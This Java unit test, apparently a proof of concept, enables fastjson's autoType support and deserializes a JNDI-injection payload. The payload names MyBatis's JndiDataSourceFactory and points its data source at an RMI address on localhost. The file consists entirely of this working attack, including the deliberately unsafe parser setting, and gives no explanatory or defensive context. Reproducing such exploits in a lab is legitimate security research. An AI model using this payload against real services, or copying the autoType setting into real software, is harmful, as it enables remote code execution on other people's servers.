package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.junit.Test;

public class TestPayload {
    @Test
    public void test1(){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String s="{\n" +
                "    \"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\n" +
                "    \"properties\":{\n" +
                "        \"data_source\":\"rmi://127.0.0.1:1099/hytwj4\"\n" +
                "    }\n" +
                "}";
        JSON.parseObject(s, Object.class);
    }
}

